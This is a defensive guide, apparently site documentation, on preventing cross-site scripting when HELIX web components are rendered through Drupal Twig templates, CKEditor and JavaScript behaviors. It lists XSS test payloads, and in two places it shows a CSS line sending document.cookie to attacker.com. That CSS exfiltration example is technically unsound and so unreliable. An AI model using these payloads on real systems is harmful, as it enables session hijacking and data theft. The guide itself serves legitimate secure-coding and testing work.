---
title: XSS Protection
description: Cross-site scripting (XSS) prevention for HELIX web components in Drupal
order: 71
---

Cross-site scripting (XSS) vulnerabilities are among the most critical security threats in web applications, particularly in healthcare where patient data and system integrity are paramount. HELIX components, when integrated into Drupal, operate at the intersection of server-side rendering and client-side web standards, creating unique security considerations that require careful attention.

This guide provides comprehensive coverage of XSS attack vectors, Drupal's built-in protections, web component-specific vulnerabilities, and best practices for maintaining a secure implementation.

## Understanding XSS in Healthcare Context

In healthcare applications, XSS attacks can lead to:

- **Patient data exfiltration** — Malicious scripts accessing protected health information (PHI)
- **Session hijacking** — Stealing authentication tokens for administrative access
- **Defacement** — Altering medical information displays that could affect clinical decisions
- **Phishing** — Injecting fake login forms to capture credentials
- **Malware distribution** — Using trusted healthcare portals to deliver malicious payloads

The stakes are higher than in typical web applications. A successful XSS attack in a healthcare system could violate HIPAA regulations, compromise patient safety, and expose organizations to significant legal and financial liability.

## XSS Attack Vectors with Web Components

Web components introduce new attack surfaces beyond traditional HTML:

### 1. Property Injection via Attributes

Unlike traditional HTML elements, web components can accept complex data through attributes that get converted to JavaScript properties:

```twig
{# VULNERABLE: Unsanitized user input in attribute #}
<hx-card variant="{{ user_input }}">
  Content
</hx-card>
```

If `user_input` contains `"><script>alert('XSS')</script><div class="`, the resulting HTML becomes:

```html
<hx-card variant=""><script>alert('XSS')</script><div class="">
  Content
</hx-card>
```

### 2. Slot Content Injection

Slots allow arbitrary HTML to be passed into Shadow DOM. If not properly sanitized, this becomes an XSS vector:

```twig
{# VULNERABLE: Raw user content in slot #}
<hx-card>
  <span slot="heading">{{ node.title|raw }}</span>
  {{ user_bio|raw }}
</hx-card>
```

Malicious content in `user_bio` executes within the component's context, potentially accessing the component's JavaScript API or manipulating the Shadow DOM.

### 3. Event Handler Manipulation

Custom element attributes that look like event handlers can be exploited:

```twig
{# VULNERABLE: Unsanitized attribute that could inject handlers #}
<hx-button {{ user_attributes|raw }}>
  Click me
</hx-button>
```

If `user_attributes` contains `onclick="maliciousCode()"`, the event handler executes on user interaction.

### 4. CSS Injection via Custom Properties

CSS custom properties can be vectors for data exfiltration or UI redress attacks:

```twig
{# VULNERABLE: Unsanitized style properties #}
<hx-card style="{{ user_styles }}">
  Content
</hx-card>
```

Malicious input like `--hx-card-bg: url('https://attacker.com/steal?data=' + document.cookie)` could exfiltrate data via CSS.

### 5. Shadow DOM Bypass Attacks

While Shadow DOM provides style encapsulation, it doesn't prevent XSS. Malicious scripts in slotted content run in the Light DOM context with full access to:

- The global JavaScript scope
- Other components on the page
- Cookies and localStorage
- The parent document's DOM

## Drupal's XSS Protection Mechanisms

Drupal provides multiple layers of defense against XSS attacks:

### Xss::filter()

The `Xss::filter()` method is Drupal's primary XSS filtering mechanism for user-generated content:

```php
use Drupal\Component\Utility\Xss;

// Basic filtering with default allowed tags
$safe_html = Xss::filter($user_input);

// Custom allowed tags
$safe_html = Xss::filter($user_input, [
  'hx-card',
  'hx-button',
  'hx-alert',
  'a',
  'em',
  'strong',
]);
```

**How it works:**

1. Parses HTML into a token stream
2. Removes all tags except those in the allowed list
3. Strips dangerous attributes (`onclick`, `onerror`, `onload`, etc.)
4. Neutralizes dangerous protocols in URLs (`javascript:`, `data:`, `vbscript:`)
5. Validates attribute values for common XSS patterns

**Default allowed tags:**

```php
[
  'a', 'em', 'strong', 'cite', 'blockquote', 'code', 'ul', 'ol',
  'li', 'dl', 'dt', 'dd', 'br', 'p', 'h2', 'h3', 'h4', 'h5', 'h6'
]
```

**Important:** `Xss::filter()` strips ALL attributes except a hardcoded safe list. This means web component attributes may be removed even if the tag itself is allowed.

### Xss::filterAdmin()

For administrative users, `Xss::filterAdmin()` allows a broader set of HTML while still protecting against XSS:

```php
use Drupal\Component\Utility\Xss;

// More permissive filtering for admin content
$safe_html = Xss::filterAdmin($admin_input);
```

This allows most HTML tags but still strips:

- `<script>` tags
- `<style>` tags (to prevent CSS-based attacks)
- Event handler attributes
- Dangerous URL protocols

**Use with caution:** Only apply to content created by trusted administrative users.

### Twig Auto-Escaping

Drupal's Twig theme engine auto-escapes all output by default:

```twig
{# Automatically escaped - safe #}
<hx-card variant="{{ user_variant }}">
  {{ user_content }}
</hx-card>
```

Output:

```html
<hx-card variant="&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;">
  &lt;img src=x onerror=alert(&#039;XSS&#039;)&gt;
</hx-card>
```

**Key behaviors:**

- All `{{ variable }}` expressions are escaped unless explicitly marked otherwise
- Escaping converts `<`, `>`, `&`, `"`, and `'` to HTML entities
- Attributes are escaped with context awareness (different escaping for HTML vs. JavaScript vs. CSS)

### The `|raw` Filter — Use with Extreme Caution

The `|raw` filter disables auto-escaping:

```twig
{# DANGEROUS: Bypasses all Twig escaping #}
{{ user_content|raw }}
```

**When to use:**

- Content has already been sanitized via `Xss::filter()` in PHP
- Content is from a trusted source (e.g., admin-created, hardcoded in code)
- Rendering a render array that Drupal has already processed

**Never use with:**

- Direct user input
- Database fields populated by untrusted users
- Query parameters or form submissions
- Any data from external APIs

### FormattableMarkup and SafeMarkup

For programmatic string building with placeholders:

```php
use Drupal\Component\Render\FormattableMarkup;

// Safe - placeholders are auto-escaped
$output = new FormattableMarkup('<hx-alert variant="@variant">@message</hx-alert>', [
  '@variant' => $user_variant,
  '@message' => $user_message,
]);
```

**Placeholder types:**

| Prefix | Escaping                               | Use Case                       |
| ------ | -------------------------------------- | ------------------------------ |
| `@var` | Plain text escape                      | Most user content              |
| `%var` | Placeholder escaped, wrapped in `<em>` | Emphasized user content        |
| `:var` | URL escaped                            | Href/src attributes            |
| `!var` | **No escaping**                        | Pre-sanitized HTML (dangerous) |

## Securing HELIX Components in Drupal

### Safe Attribute Patterns

Always escape user input in attributes:

```twig
{# SAFE: Twig auto-escapes attribute values #}
<hx-button
  variant="{{ content.field_variant.0['#markup'] }}"
  hx-size="{{ content.field_size.0['#markup'] }}"
>
  {{ content.field_label }}
</hx-button>
```

Even if malicious content is injected, Twig converts it to entities:

```html
<!-- Input: variant='"><script>alert(1)</script>' -->
<!-- Output: -->
<hx-button variant='"&gt;&lt;script&gt;alert(1)&lt;/script&gt;'></hx-button>
```

### Boolean Attributes

For boolean attributes, never use user input directly:

```twig
{# UNSAFE: Direct user control #}
<hx-button {{ user_input }}>Click</hx-button>

{# SAFE: Controlled boolean logic #}
<hx-button {% if content.field_disabled.0['#markup'] == 'true' %}disabled{% endif %}>
  Click
</hx-button>
```

### Slot Content Sanitization

When rendering user content in slots, ensure it's sanitized:

```twig
{# SAFE: Twig auto-escapes slot content #}
<hx-card>
  <span slot="heading">{{ node.title }}</span>
  {{ content.body }}
</hx-card>
```

For formatted text fields (with HTML):

```twig
{# SAFE: Drupal's text filter pipeline has already sanitized #}
<hx-card>
  <span slot="heading">{{ node.title }}</span>
  {{ content.body|render }}
</hx-card>
```

The `|render` filter processes Drupal render arrays, which include sanitization from the text format configuration.

### Handling User-Submitted HTML

For rich text editor content:

```php
// In a controller or preprocess function
use Drupal\Component\Utility\Xss;

$allowed_tags = [
  'hx-card',
  'hx-button',
  'hx-alert',
  'a', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li',
];

$variables['safe_content'] = Xss::filter(
  $user_submitted_html,
  $allowed_tags
);
```

```twig
{# In template - already sanitized in PHP #}
<hx-prose>
  {{ safe_content|raw }}
</hx-prose>
```

**Critical:** Only use `|raw` AFTER sanitization in PHP. Document why `|raw` is safe in comments.

### Custom Attribute Sanitization

When building custom attributes from user data:

```php
use Drupal\Core\Template\Attribute;

$attributes = new Attribute([
  'variant' => $user_variant, // Auto-escaped by Attribute class
  'hx-size' => $user_size,
]);

$variables['card_attributes'] = $attributes;
```

```twig
<hx-card {{ card_attributes }}>
  Content
</hx-card>
```

The `Attribute` class automatically escapes all values and provides XSS protection.

### URL Sanitization

For components with href attributes:

```twig
{# SAFE: Drupal's URL system validates URLs #}
<hx-button
  hx-href="{{ path('entity.node.canonical', {'node': node.id}) }}"
>
  Read more
</hx-button>

{# SAFE: For external URLs from user input, validate in PHP first #}
<hx-card hx-href="{{ content.field_link.0['#url'] }}">
  {{ content.field_link.0['#title'] }}
</hx-card>
```

For user-submitted URLs, validate in PHP:

```php
use Drupal\Core\Url;

try {
  $url = Url::fromUri($user_url);
  if ($url->isExternal()) {
    // Validate against allowed domains
    $allowed_domains = ['example.com', 'trusted-partner.org'];
    $host = parse_url($user_url, PHP_URL_HOST);
    if (!in_array($host, $allowed_domains)) {
      throw new \Exception('Untrusted domain');
    }
  }
  $variables['safe_url'] = $url->toString();
} catch (\Exception $e) {
  // Log and use fallback
  $variables['safe_url'] = '/';
}
```

## CKEditor 5 Integration Security

When allowing HELIX components in CKEditor:

### General HTML Support (GHS) Configuration

```javascript
// ckeditor5_config.js
ClassicEditor.create(element, {
  htmlSupport: {
    allow: [
      {
        name: /^hx-(button|card|alert|badge)$/,
        attributes: {
          variant: true,
          'hx-size': true,
          'hx-href': true,
          disabled: true,
        },
        classes: false, // Prevent arbitrary classes
        styles: false, // Prevent inline styles
      },
    ],
    disallow: [
      {
        attributes: [
          { key: /^on.*/, value: true }, // Block all event handlers
          { key: 'style', value: true }, // Block inline styles
          { key: 'script', value: true },
        ],
      },
    ],
  },
});
```

### Source Editing Restrictions

If Source Editing plugin is enabled, users can bypass GHS. Either:

1. **Disable Source Editing for untrusted users:**

```javascript
// Only allow for admin role
if (!drupalSettings.user.roles.includes('administrator')) {
  config.removePlugins = ['SourceEditing'];
}
```

2. **Post-process CKEditor output with Xss::filter():**

```php
$editor_output = $form_state->getValue('field_content');
$safe_output = Xss::filter($editor_output, $allowed_tags);
```

### Plugin-Based Component Insertion

Create CKEditor plugins that insert pre-validated component templates:

```javascript
// InsertHelixCardCommand.js
class InsertHelixCardCommand extends Command {
  execute({ variant = 'default' }) {
    // Whitelist variant values
    const allowedVariants = ['default', 'featured', 'compact'];
    const safeVariant = allowedVariants.includes(variant) ? variant : 'default';

    const cardElement = `<hx-card variant="${safeVariant}">
      <span slot="heading">Heading</span>
      <p>Content</p>
    </hx-card>`;

    this.editor.model.change((writer) => {
      // Insert validated HTML
      const viewFragment = this.editor.data.processor.toView(cardElement);
      const modelFragment = this.editor.data.toModel(viewFragment);
      this.editor.model.insertContent(modelFragment);
    });
  }
}
```

This approach prevents users from manually typing component tags with arbitrary attributes.

## JavaScript API Security

When using Drupal Behaviors to interact with HELIX components:

### Safe Event Handling

```javascript
(function (Drupal, once) {
  'use strict';

  Drupal.behaviors.helixCard = {
    attach(context) {
      once('hx-card-init', 'hx-card[hx-href]', context).forEach((card) => {
        card.addEventListener('hx-card-click', (e) => {
          const url = e.detail.url;

          // SAFE: Validate URL before navigation
          try {
            const urlObject = new URL(url, window.location.origin);

            // Only allow same-origin or whitelisted domains
            const allowedHosts = [window.location.host, 'trusted-partner.example.com'];

            if (!allowedHosts.includes(urlObject.host)) {
              console.error('Navigation blocked: untrusted URL', url);
              return;
            }

            window.location.href = urlObject.href;
          } catch (err) {
            console.error('Invalid URL:', url);
          }
        });
      });
    },
  };
})(Drupal, once);
```

### Property Setting from User Data

When setting component properties dynamically:

```javascript
// UNSAFE: Direct assignment from user data
card.variant = userData.variant; // Could be anything

// SAFE: Whitelist allowed values
const allowedVariants = ['default', 'featured', 'compact'];
card.variant = allowedVariants.includes(userData.variant) ? userData.variant : 'default';
```

### DOM Manipulation

Never insert unsanitized HTML into component slots:

```javascript
// UNSAFE: innerHTML with user data
card.innerHTML = `<span slot="heading">${userData.title}</span>`;

// SAFE: Use textContent or createElement
const heading = document.createElement('span');
heading.setAttribute('slot', 'heading');
heading.textContent = userData.title; // Auto-escaped
card.appendChild(heading);
```

For HTML that's already been sanitized server-side:

```javascript
// Only use if server already sanitized
const safeHTML = card.dataset.sanitizedContent; // From PHP Xss::filter()
const template = document.createElement('template');
template.innerHTML = safeHTML;
card.appendChild(template.content);
```

## Shadow DOM Security Considerations

Shadow DOM provides style encapsulation but does NOT provide security isolation:

### What Shadow DOM Protects

- **Style leakage** — Styles inside Shadow DOM don't affect the outside document
- **Selector collisions** — IDs and classes inside Shadow DOM don't conflict with Light DOM

### What Shadow DOM Does NOT Protect

- **Script execution** — Scripts in slotted content execute with full page access
- **Event propagation** — Events bubble out of Shadow DOM (unless `composed: false`)
- **Data access** — Slotted content can access `window`, `document`, cookies, localStorage
- **XSS attacks** — Malicious scripts in slots run in the global scope

### Slot Content Best Practices

```twig
{# SAFE: Escaped text content #}
<hx-card>
  <span slot="heading">{{ user_heading }}</span>
  {{ user_content }}
</hx-card>

{# UNSAFE: Raw HTML in slot #}
<hx-card>
  <span slot="heading">{{ user_heading|raw }}</span>
  {{ user_content|raw }}
</hx-card>
```

Even inside Shadow DOM, always sanitize slotted HTML.

### CSS Injection via Custom Properties

CSS custom properties can cross the Shadow boundary:

```twig
{# UNSAFE: User-controlled style #}
<hx-card style="{{ user_styles }}">
  Content
</hx-card>
```

Attackers could use CSS to:

1. **Exfiltrate data via background images:**

   ```css
   --hx-card-bg: url('https://attacker.com/steal?cookie=' + document.cookie);
   ```

2. **UI redressing (clickjacking):**
   ```css
   --hx-card-opacity: 0;
   position: absolute;
   ```

**Mitigation:**

```php
// In PHP: Strip or validate style attribute
$attributes = new Attribute();
// Don't add user-controlled style attribute
```

```twig
{# Only use predefined theme tokens #}
<hx-card class="user-content-card">
  Content
</hx-card>
```

Define safe styling in your theme's CSS using the component's CSS custom properties.

## Testing for XSS Vulnerabilities

### Manual Testing Payloads

Test your implementation with these XSS vectors:

**1. Basic script injection:**

```
<script>alert('XSS')</script>
```

**2. Attribute breakout:**

```
"><script>alert('XSS')</script><div class="
```

**3. Event handler injection:**

```
" onclick="alert('XSS')" x="
```

**4. JavaScript protocol:**

```
javascript:alert('XSS')
```

**5. Data URL:**

```
data:text/html,<script>alert('XSS')</script>
```

**6. SVG-based XSS:**

```
<svg/onload=alert('XSS')>
```

**7. HTML entity encoding bypass:**

```
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### Automated Testing

Use Drupal's built-in test framework:

```php
namespace Drupal\Tests\my_module\Functional;

use Drupal\Tests\BrowserTestBase;

class HelixComponentXssTest extends BrowserTestBase {

  protected static $modules = ['my_module'];

  public function testCardXssPrevention() {
    // Create node with XSS attempt in title
    $xss_payload = '<script>alert("XSS")</script>';
    $node = $this->createNode([
      'type' => 'article',
      'title' => $xss_payload,
    ]);

    $this->drupalGet($node->toUrl());

    // Verify payload is escaped, not executed
    $this->assertSession()->responseNotContains('<script>');
    $this->assertSession()->responseContains('&lt;script&gt;');

    // Verify it appears in component attribute escaped
    $escaped = htmlspecialchars($xss_payload, ENT_QUOTES);
    $this->assertSession()->responseContains($escaped);
  }

  public function testSlotContentXssPrevention() {
    $user = $this->createUser(['create article content']);
    $this->drupalLogin($user);

    // Submit form with XSS payload in body
    $edit = [
      'title[0][value]' => 'Test Article',
      'body[0][value]' => '<img src=x onerror=alert("XSS")>',
    ];
    $this->drupalPostForm('node/add/article', $edit, 'Save');

    // Verify the payload is sanitized
    $this->assertSession()->responseNotContains('onerror=');
    $this->assertSession()->responseNotMatches('/<img[^>]+src=["\']?x/');
  }
}
```

### Security Headers

Configure Content Security Policy (CSP) to prevent inline script execution:

```php
// In settings.php or custom module
function my_module_page_attachments_alter(array &$attachments) {
  $csp = [
    "default-src 'self'",
    "script-src 'self'", // No 'unsafe-inline'
    "style-src 'self' 'unsafe-inline'", // Needed for web components
    "img-src 'self' data: https:",
  ];

  $attachments['#attached']['http_header'][] = [
    'Content-Security-Policy',
    implode('; ', $csp),
  ];
}
```

This prevents any inline `<script>` tags or event handlers from executing, even if XSS filtering fails.

## Best Practices Summary

### For Theme Developers

1. **Never use `|raw` without PHP sanitization first**
2. **Rely on Twig auto-escaping for user content**
3. **Use the `Attribute` class for dynamic attributes**
4. **Validate boolean attributes with conditional logic, not user strings**
5. **Document any use of `|raw` with comments explaining why it's safe**
6. **Test templates with XSS payloads before deployment**

### For Module Developers

1. **Always sanitize user input with `Xss::filter()` before storage**
2. **Use `FormattableMarkup` for programmatic string building**
3. **Validate URLs with `Url::fromUri()` and whitelist domains**
4. **Use placeholder tokens (`@`, `%`, `:`) instead of concatenation**
5. **Configure text formats to allow only necessary HTML tags**
6. **Implement automated tests for XSS prevention**

### For Site Builders

1. **Limit CKEditor's Source Editing plugin to administrators only**
2. **Configure text formats with minimal allowed tags**
3. **Use General HTML Support (GHS) to whitelist component attributes**
4. **Enable Content Security Policy headers**
5. **Regularly audit user-generated content for malicious patterns**
6. **Train content editors on safe practices**

### For JavaScript Developers

1. **Validate event detail payloads before using**
2. **Use `textContent` instead of `innerHTML` for user data**
3. **Whitelist allowed values when setting component properties**
4. **Validate URLs before navigation or AJAX requests**
5. **Use CSP-compatible patterns (no inline event handlers)**

## Component-Specific Patterns

### hx-button

```twig
{# SAFE: All user content escaped #}
<hx-button
  variant="{{ content.field_variant.0['#markup'] }}"
  hx-size="{{ content.field_size.0['#markup'] }}"
  {% if content.field_disabled.0['#markup'] == 'true' %}disabled{% endif %}
  hx-href="{{ content.field_link.0['#url'] }}"
>
  {{ content.field_label }}
</hx-button>
```

### hx-card

```twig
{# SAFE: Sanitized slot content #}
<hx-card
  variant="{{ content.field_card_style.0['#markup'] }}"
  elevation="{{ content.field_elevation.0['#markup'] }}"
>
  <span slot="heading">{{ node.title }}</span>

  {# Formatted text - already sanitized by text filter #}
  {{ content.body }}

  <div slot="footer">
    <hx-button hx-href="{{ path('entity.node.canonical', {'node': node.id}) }}">
      Read more
    </hx-button>
  </div>
</hx-card>
```

### hx-alert

```twig
{# SAFE: Variant validated, content escaped #}
{% set allowed_variants = ['info', 'success', 'warning', 'error'] %}
{% set safe_variant = content.field_type.0['#markup'] in allowed_variants
  ? content.field_type.0['#markup']
  : 'info' %}

<hx-alert variant="{{ safe_variant }}">
  <strong slot="heading">{{ content.field_heading }}</strong>
  {{ content.field_message }}
</hx-alert>
```

### hx-text-input

```twig
{# SAFE: Form elements with validated attributes #}
<hx-text-input
  name="patient_name"
  label="{{ 'Patient Name'|t }}"
  value="{{ form.patient_name['#default_value'] }}"
  {% if form.patient_name['#required'] %}required{% endif %}
  {% if form.patient_name['#disabled'] %}disabled{% endif %}
></hx-text-input>
```

## Compliance and Auditing

### HIPAA Considerations

Under HIPAA, XSS vulnerabilities that could expose PHI are considered security incidents requiring:

- **Risk assessment** — Evaluate the scope of potential data exposure
- **Incident reporting** — Document the vulnerability and remediation
- **Breach notification** — If PHI was accessed, notify affected individuals
- **Corrective action** — Implement controls to prevent recurrence

**Recommended controls:**

- Code review gates requiring security approval
- Automated XSS scanning in CI/CD pipelines
- Regular penetration testing by third-party auditors
- Security training for all developers

### Security Audit Checklist

Before deployment, verify:

- [ ] All user input is sanitized via `Xss::filter()` or auto-escaped by Twig
- [ ] No use of `|raw` filter without explicit sanitization
- [ ] URL attributes validated against whitelist or via Drupal's `Url` API
- [ ] Boolean attributes set via conditional logic, not user strings
- [ ] CKEditor configured with GHS and restricted Source Editing
- [ ] Content Security Policy headers configured and tested
- [ ] Automated tests cover XSS attack vectors
- [ ] All custom Drupal Behaviors validate event detail payloads
- [ ] No inline event handlers (`onclick`, etc.) in templates
- [ ] CSS custom properties not set from user input

## Additional Resources

This guide synthesizes best practices from official Drupal security documentation and web component security research:

- [Writing secure code for Drupal | Drupal.org](https://www.drupal.org/docs/administering-a-drupal-site/security-in-drupal/writing-secure-code-for-drupal)
- [Xss::filter() API Documentation | Drupal.org](https://api.drupal.org/api/drupal/core!lib!Drupal!Component!Utility!Xss.php/function/Xss::filter/8.9.x)
- [Twig autoescape | Drupal.org](https://www.drupal.org/node/2296163)
- [HTML Sanitizer API | MDN](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)
- [Shadow DOM Security | Imperva](https://www.imperva.com/learn/application-security/shadow-dom/)
- [Cross Site Scripting Prevention Cheat Sheet | OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Effective XSS Prevention in Drupal | Medium](https://medium.com/@er_anwar/effective-strategies-for-preventing-cross-site-scripting-xss-attacks-in-drupal-4cb3adab65e4)

---

**Security is not a feature — it is a requirement.** In healthcare applications, every XSS vulnerability is a potential HIPAA violation and patient safety risk. Treat user input as hostile, validate at every boundary, and maintain a zero-tolerance policy for security shortcuts.

When in doubt, escape. When uncertain, sanitize. When critical, audit.
